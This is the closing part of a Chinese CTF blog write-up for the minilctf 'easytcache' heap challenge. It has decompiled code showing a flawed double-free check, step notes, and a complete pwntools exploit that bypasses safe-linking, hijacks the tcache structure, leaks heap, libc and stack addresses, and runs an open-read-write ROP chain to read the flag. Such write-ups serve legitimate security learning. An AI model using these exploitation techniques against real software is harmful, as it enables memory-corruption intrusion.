<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v7 = freeinfo[index];</span><br><span class="line">freeinfo[index] ^= <span class="number">1u</span>;                        <span class="comment">// free两次就可以重新获得且第二次不会执行free</span></span><br><span class="line"><span class="keyword">if</span> ( v7 )                                     <span class="comment">// double-free检测没用</span></span><br><span class="line">&#123;</span><br><span class="line">  v4 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">         &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">         <span class="string">&quot;Double free detected! You can&#x27;t delete a note more than once!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_28D0(&amp;unk_8240);</span><br><span class="line">  sub_28D0(a1);</span><br><span class="line">  sub_32FC(&amp;unk_8260, index);</span><br><span class="line">  v4 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>显然double-free检测没用，free后再次free就可以重置标志位（此时只算作一次free），相当于UAF</p>
<p>则解题步骤为：</p>
<ul>
<li>先add一个chunk_0（要注意chunk应该尽量大），然后free两次进入tcache，由于safe-linking机制，直接show可以得到堆地址。再free两次使对应tcache_count&#x3D;2。此时再修改fd位，使指向tcache_struct结构体，然后申请chunk_1，chunk_2，chunk_2即为tcache_struct位置。</li>
<li>edit修改tcache_struct结构体，将对应位置的count修改为7，然后free两次chunk_0，show出libc地址。此时只剩下两次add。</li>
<li>再edit chunk_2使某指针指向<code>_environ</code>变量，add出来然后show得到栈地址。得到栈地址后修改tcache_struct中任意指针为指定栈地址布置rop_chain，直接orw</li>
</ul>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./easytcache&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./easytcache&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;size?&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index?&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;content?&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index?&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#可add 5个堆块，free 3次</span></span><br><span class="line">add(<span class="number">0x200</span>)       <span class="comment">#0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">heapbase = (u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x11</span>)&lt;&lt;<span class="number">12</span></span><br><span class="line">log.success(<span class="string">&#x27;heapbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)   <span class="comment">#清除key域</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">pos = heapbase+<span class="number">0x11000</span></span><br><span class="line">edit(<span class="number">0</span>, p64((heapbase+<span class="number">0x10</span>)^(pos&gt;&gt;<span class="number">12</span>)))   <span class="comment">#修改fd域为tcache结构体</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x200</span>)       <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x200</span>)       <span class="comment">#2      控制tcache结构体</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, p16(<span class="number">0</span>)*<span class="number">0x1f</span>+p16(<span class="number">7</span>)*<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">2</span>)        <span class="comment">#泄露libc</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">libcbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1e0c01</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#后续利用_environ泄露栈地址，直接在栈上ROP即可</span></span><br><span class="line">environ = libcbase+libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]</span><br><span class="line">edit(<span class="number">2</span>, p16(<span class="number">7</span>)*<span class="number">0x40</span>+p64(<span class="number">0</span>)*<span class="number">0x1f</span>+p64(environ))       <span class="comment">#修改0x210处指针为目标位置</span></span><br><span class="line">add(<span class="number">0x200</span>)      <span class="comment">#3</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">stack = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x150</span></span><br><span class="line">log.success(<span class="string">&#x27;stack ===&gt; &#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">pop_rdi = libcbase+<span class="number">0x28a55</span></span><br><span class="line">pop_rsi = libcbase+<span class="number">0x2a4cf</span></span><br><span class="line">pop_rdx = libcbase+<span class="number">0xc7f32</span></span><br><span class="line">open_ = libcbase+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_ = libcbase+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts = libcbase+libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">bss = libcbase+<span class="number">0x1e2000</span></span><br><span class="line"><span class="comment">#修改栈</span></span><br><span class="line">edit(<span class="number">2</span>, p16(<span class="number">7</span>)*<span class="number">0x40</span>+p64(<span class="number">0</span>)*<span class="number">0x1f</span>+p64(stack-<span class="number">0x18</span>))       <span class="comment">#stack-0x18是因为此处未对齐,还有不能影响程序的正常执行(stack-8会产生异常)</span></span><br><span class="line">add(<span class="number">0x200</span>)      <span class="comment">#4</span></span><br><span class="line">rop_chain = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(<span class="number">0x10</span>)+p64(read_)\</span><br><span class="line">           +p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)+p64(open_)\</span><br><span class="line">           +p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(<span class="number">0x50</span>)+p64(read_)\</span><br><span class="line">           +p64(pop_rdi)+p64(bss)+p64(puts)</span><br><span class="line">edit(<span class="number">4</span>, rop_chain)</span><br><span class="line">io.recvline()</span><br><span class="line">io.send(<span class="string">b&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>


        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> 《从零开始的pwner生活》</li>
        <li><strong>Author:</strong> Static</li>
        <li><strong>Created at
                :</strong> 2024-01-23 15:53:13</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2023-04-26 14:47:13
            </li>
        
        <li>
            <strong>Link:</strong> https://staticccccccc.github.io/2024/01/23/一些pwn题的writeup/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/CTFS/">#CTFS</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2024/01/23/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023-jit/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">西湖论剑2023-jit</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="waline"></div>
    <script type="module" data-swup-reload-script>
      import { init } from '/js/libs/waline.mjs';

      function loadWaline() {
        init({
          el: '#waline',
          serverURL: 'https://example.example.com',
          lang: 'zh-CN',
          dark: 'body[class~="dark-mode"]',
          requiredMeta: ['nick', 'mail'],
          emoji: [],
          recaptchaV3Key: "wasd",
          
        });
      }

      if (typeof swup !== 'undefined') {
        loadWaline();
      } else {
        window.addEventListener('DOMContentLoaded', loadWaline);
      }
    </script>



        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">《从零开始的pwner生活》</div>
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#task01"><span class="nav-text">task01</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-ciscn-2019-s-4-ret2text-stack-migration"><span class="nav-text">0x01.ciscn_2019_s_4  (ret2text  + stack_migration)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-MSSCTF2020-Wallet-got-hijack"><span class="nav-text">0x02.MSSCTF2020 - Wallet( got hijack )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-moeCTF2021-baby-canary-canary-leak-ret2libc"><span class="nav-text">0x03.moeCTF2021 - baby canary( canary leak + ret2libc )</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#task02"><span class="nav-text">task02</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-ciscn-2019-c-1-ret2libc"><span class="nav-text">0x01.ciscn_2019_c_1( ret2libc )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-ciscn-2019-s-3-ret2csu-SROP"><span class="nav-text">0x02.ciscn_2019_s_3( ret2csu | SROP )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-BJDCTF-2nd-r2t4-got-hijack"><span class="nav-text">0x03.[BJDCTF 2nd]r2t4( got hijack )</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#task03"><span class="nav-text">task03</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-ciscn-2019-n-7-exit-hook%E5%8A%AB%E6%8C%81-FSOP"><span class="nav-text">0x01.ciscn_2019_n_7( exit_hook劫持  | FSOP)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-warmup-orw"><span class="nav-text">0x02.[V&amp;N2020 公开赛]warmup( orw )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-minilCTF2020-easycpp-cpp"><span class="nav-text">0x03.minilCTF2020 - easycpp( cpp )</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#task04"><span class="nav-text">task04</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-ZJCTF-2019-Login-ret2text"><span class="nav-text">0x01.[ZJCTF 2019]Login ( ret2text )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-pwnable-tw-dubblesort-ret2libc"><span class="nav-text">0x02.pwnable.tw - dubblesort( ret2libc )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-babyfengshui-33c3-2016-got-hijack"><span class="nav-text">0x03.babyfengshui_33c3_2016( got hijack )</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#task05"><span class="nav-text">task05</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-babyheap-0ctf-2017-heap-overflow-fastbin-attack"><span class="nav-text">0x01.babyheap_0ctf_2017( heap_overflow + fastbin attack )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-pwnable-tw-3%C3%9717-fini-array%E5%8A%AB%E6%8C%81"><span class="nav-text">0x02.pwnable.tw - 3×17( fini_array劫持 )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-ciscn-2019-final-3-tcache-poisoning-UAF"><span class="nav-text">0x03.ciscn_2019_final_3( tcache poisoning + UAF )</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#task06"><span class="nav-text">task06</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-pwnable-tw-heap-paradise-UAF-fastbin-attack"><span class="nav-text">0x01.pwnable.tw - heap paradise ( UAF + fastbin attack )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-V-N2020%E5%85%AC%E5%BC%80%E8%B5%9B-simpleHeap-off-by-one-fastbin-attack-one-gadget"><span class="nav-text">0x02.[V &amp; N2020公开赛]simpleHeap (off by one + fastbin attack + one gadget)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BE%8E%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89-baby-focal-fastbin-attack-stdout-leak"><span class="nav-text">0x03.第三届美团网络安全高校挑战赛（初赛） - baby_focal ( fastbin attack + stdout leak )</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#task07"><span class="nav-text">task07</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-houseoforange-hitcon-2016-House-of-Orange-house-of-orange"><span class="nav-text">0x01.houseoforange_hitcon_2016 - House of Orange ( house of orange )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-bytectf-2020-gun-UAF-fastbin-double-free-orw"><span class="nav-text">0x02.bytectf 2020 - gun( UAF+fastbin double-free+orw )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-minilctf-easytcache-safe-linking%E7%BB%95%E8%BF%87-tcache-struct%E5%8A%AB%E6%8C%81-ROP"><span class="nav-text">0x03.minilctf - easytcache( safe-linking绕过+tcache_struct劫持+ROP )</span></a></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2022</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Static</a>
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>









<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
